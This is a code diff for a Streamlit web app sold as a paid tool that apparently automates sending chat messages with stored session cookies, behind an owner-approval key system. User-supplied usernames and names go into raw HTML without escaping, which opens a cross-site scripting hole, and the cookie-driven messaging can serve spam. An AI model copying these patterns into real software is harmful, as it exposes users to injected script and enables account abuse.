+            status_class = approval_status.lower() if approval_status else 'pending'
+            status_icon = "🟢" if approval_status == 'approved' else "🟡" if approval_status == 'pending' else "🔴"
+            
+            st.markdown(f"""
+            <div class="user-card">
+                {status_icon} <strong>Username:</strong> {username} | 
+                <strong>Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
+                <strong>Real Name:</strong> {real_name}
+            </div>
+            """, unsafe_allow_html=True)
 
 elif not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
     
     with tab1:
-        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
         st.markdown("### Welcome Back!")
         
         username = st.text_input("Username", key="login_username", placeholder="Enter your username")
@@ -1277,6 +964,7 @@ elif not st.session_state.logged_in:
             if username and password:
                 user_id = db.verify_user(username, password)
                 if user_id:
+                    # Check approval status
                     approval_status = db.get_approval_status(user_id)
                     
                     if approval_status == 'approved':
@@ -1285,6 +973,7 @@ elif not st.session_state.logged_in:
                         st.session_state.username = username
                         st.session_state.approval_status = 'approved'
                         
+                        # Get or generate approval key
                         approval_key = db.get_approval_key(user_id)
                         if not approval_key:
                             approval_key = generate_approval_key(username, user_id)
@@ -1298,14 +987,16 @@ elif not st.session_state.logged_in:
                             if user_config and user_config['chat_id']:
                                 start_automation(user_config, user_id)
                         
-                        st.success(f"✅ Welcome back, {username}!")
+                        st.success(f"Welcome back, {username}!")
                         st.rerun()
                     else:
+                        # User needs approval
                         st.session_state.logged_in = True
                         st.session_state.user_id = user_id
                         st.session_state.username = username
                         st.session_state.approval_status = approval_status or 'pending'
                         
+                        # Get or generate approval key
                         approval_key = db.get_approval_key(user_id)
                         if not approval_key:
                             approval_key = generate_approval_key(username, user_id)
@@ -1314,13 +1005,11 @@ elif not st.session_state.logged_in:
                         st.session_state.approval_key = approval_key
                         st.rerun()
                 else:
-                    st.error("❌ Invalid username or password!")
+                    st.error("Invalid username or password!")
             else:
-                st.warning("⚠️ Please enter both username and password")
-        st.markdown('</div>', unsafe_allow_html=True)
+                st.warning("Please enter both username and password")
     
     with tab2:
-        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
         st.markdown("### Create New Account")
         
         new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
@@ -1330,51 +1019,55 @@ elif not st.session_state.logged_in:
         if st.button("Create Account", key="signup_btn", use_container_width=True):
             if new_username and new_password and confirm_password:
                 if new_password == confirm_password:
+                    # FIXED: Handle the return values properly
                     result = db.create_user(new_username, new_password)
                     
+                    # Check if result has expected format
                     if isinstance(result, tuple) and len(result) >= 2:
                         success, message = result[0], result[1]
                         user_id = result[2] if len(result) > 2 else None
                     else:
+                        # Handle case where function returns different format
                         success = result if isinstance(result, bool) else False
                         message = "User creation completed" if success else "User creation failed"
                         user_id = None
                     
                     if success:
                         if user_id:
+                            # Generate approval key for new user
                             approval_key = generate_approval_key(new_username, user_id)
                             db.set_approval_key(user_id, approval_key)
                         
-                        st.success(f"✅ {message} Please login now!")
+                        st.success(f"{message} Please login now!")
                     else:
-                        st.error(f"❌ {message}")
+                        st.error(f"{message}")
                 else:
-                    st.error("❌ Passwords do not match!")
+                    st.error("Passwords do not match!")
             else:
-                st.warning("⚠️ Please fill all fields")
-        st.markdown('</div>', unsafe_allow_html=True)
+                st.warning("Please fill all fields")
 
 else:
     # User is logged in but needs approval
     if st.session_state.approval_status != 'approved':
-        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
         st.markdown("### 🔒 Approval Required")
         
+        # User Info Box
         st.markdown(f"""
-        <div style="background: rgba(30, 41, 59, 0.7); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
-            <h4>👤 User Information</h4>
+        <div class="premium-card">
+            <h3>👤 User Information</h3>
             <p><strong>Username:</strong> {st.session_state.username}</p>
             <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
         </div>
         """, unsafe_allow_html=True)
         
+        # Approval Key Box
         st.markdown(f"""
-        <div style="background: rgba(30, 41, 59, 0.8); padding: 20px; border-radius: 12px; margin: 20px 0; text-align: center; border: 2px solid #3b82f6;">
-            <h4>🔑 Your Approval Key</h4>
-            <div style="font-size: 1.5rem; font-weight: bold; letter-spacing: 2px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #3b82f6;">
+        <div class="premium-card">
+            <h3>🔑 Your Approval Key</h3>
+            <div style="font-size: 1.2rem; font-weight: bold; letter-spacing: 2px; background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 5px; margin: 1rem 0; border: 1px solid #f59e0b;">
                 {st.session_state.approval_key}
             </div>
-            <button style="background: #3b82f6; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
+            <button style="background: #f59e0b; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
         </div>
         """, unsafe_allow_html=True)
         
@@ -1386,13 +1079,18 @@ else:
             st.session_state.user_real_name = user_real_name
             db.update_user_real_name(st.session_state.user_id, user_real_name)
         
+        # Send Approval Request Button
+        st.markdown("### 📤 Send Approval Request")
+        
         if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
             if st.session_state.user_real_name:
-                st.success("✅ Approval request ready! Use the contact buttons below to send it.")
+                st.success("Approval request ready! Use the contact buttons below to send it.")
             else:
-                st.warning("⚠️ Please enter your real name first")
+                st.warning("Please enter your real name first")
         
+        # Contact buttons
         st.markdown("### 📞 Contact Waleed Khan for Approval")
+        
         col1, col2, col3 = st.columns(3)
         
         with col1:
@@ -1416,6 +1114,9 @@ else:
             )
             st.markdown(f'<a href="{telegram_url}" style="display: block; text-align: center; background: linear-gradient(135deg, #0088cc, #006699); color: white; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 600; margin: 10px 0;" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
         
+        st.info("After sending the approval request, wait for Waleed to approve your key. Refresh this page to check your approval status.")
+        
+        # Check approval status
         if st.button("🔄 Check Approval Status", use_container_width=True):
             current_status = db.get_approval_status(st.session_state.user_id)
             st.session_state.approval_status = current_status
@@ -1424,7 +1125,7 @@ else:
                 st.success("🎉 Your account has been approved! You can now access the automation features.")
                 st.rerun()
             else:
-                st.warning("⏳ Your approval is still pending. Please wait for Waleed to approve your request.")
+                st.warning("Your approval is still pending. Please wait for Waleed to approve your request.")
         
         if st.sidebar.button("🚪 Logout"):
             st.session_state.logged_in = False
@@ -1434,8 +1135,6 @@ else:
             st.session_state.approval_key = None
             st.session_state.user_real_name = ""
             st.rerun()
-        
-        st.markdown('</div>', unsafe_allow_html=True)
     
     else:
         # User is approved and can access automation
@@ -1451,6 +1150,7 @@ else:
         st.sidebar.markdown(f"**Status:** <span class='status-badge status-approved'>✅ Approved</span>", unsafe_allow_html=True)
         st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
         
+        # USER PANEL LOGOUT BUTTON
         if st.sidebar.button("🚪 Logout", use_container_width=True):
             if st.session_state.automation_state.running:
                 stop_automation(st.session_state.user_id)
@@ -1505,7 +1205,7 @@ else:
                         final_cookies,
                         messages_content
                     )
-                    st.success("✅ Configuration saved successfully!")
+                    st.success("Configuration saved successfully!")
                     st.rerun()
                 st.markdown('</div>', unsafe_allow_html=True)
             
@@ -1516,29 +1216,14 @@ else:
                 col1, col2, col3 = st.columns(3)
                 
                 with col1:
-                    st.markdown("""
-                    <div class="metric-card">
-                        <div class="metric-value">{}</div>
-                        <div class="metric-label">Messages Sent</div>
-                    </div>
-                    """.format(st.session_state.automation_state.message_count), unsafe_allow_html=True)
+                    st.metric("Messages Sent", st.session_state.automation_state.message_count)
                 
                 with col2:
                     status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
-                    st.markdown(f"""
-                    <div class="metric-card">
-                        <div class="metric-value">{status}</div>
-                        <div class="metric-label">Status</div>
-                    </div>
-                    """, unsafe_allow_html=True)
+                    st.metric("Status", status)
                 
                 with col3:
-                    st.markdown("""
-                    <div class="metric-card">
-                        <div class="metric-value">{}</div>
-                        <div class="metric-label">Total Logs</div>
-                    </div>
-                    """.format(len(st.session_state.automation_state.logs)), unsafe_allow_html=True)
+                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
                 
                 col1, col2 = st.columns(2)
                 
@@ -1549,7 +1234,7 @@ else:
                             start_automation(current_config, st.session_state.user_id)
                             st.rerun()
                         else:
-                            st.error("⚠️ Please configure Chat ID first!")
+                            st.error("Please configure Chat ID first!")
                 
                 with col2:
                     if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
@@ -1559,26 +1244,25 @@ else:
                 st.markdown("### 📜 Live Logs")
                 
                 if st.session_state.automation_state.logs:
-                    logs_html = '<div class="log-console">'
-                    for log in st.session_state.automation_state.logs[-30:]:
-                        logs_html += f'<div class="log-entry">{log}</div>'
+                    logs_html = '<div class="log-container">'
+                    for log in st.session_state.automation_state.logs[-50:]:
+                        logs_html += f'<div>{log}</div>'
                     logs_html += '</div>'
                     st.markdown(logs_html, unsafe_allow_html=True)
                 else:
-                    st.info("📝 No logs yet. Start automation to see logs here.")
+                    st.info("No logs yet. Start automation to see logs here.")
                 
                 if st.session_state.automation_state.running:
                     time.sleep(1)
                     st.rerun()
                 st.markdown('</div>', unsafe_allow_html=True)
 
+st.markdown('</div>', unsafe_allow_html=True)  # Close premium-card
+
 # Premium Footer
 st.markdown("""
 <div class="premium-footer">
-    <div style="font-size: 1.2rem; font-weight: bold; color: white; margin-bottom: 10px;">WALEED E2E PAID TOOL</div>
-    <p>Premium Automation Suite • Version 3.0</p>
-    <p>© 2025 Waleed XD • All Rights Reserved</p>
+    <div style="color: white; font-size: 1.1rem; font-weight: bold; margin-bottom: 10px;">WALEED XD E2E PAID TOOL</div>
+    <p>Made with ❤️ by WALEED XD © 2025 All Rights Reserved</p>
 </div>
 """, unsafe_allow_html=True)
-
-st.markdown('</div>', unsafe_allow_html=True)  # Close premium-container
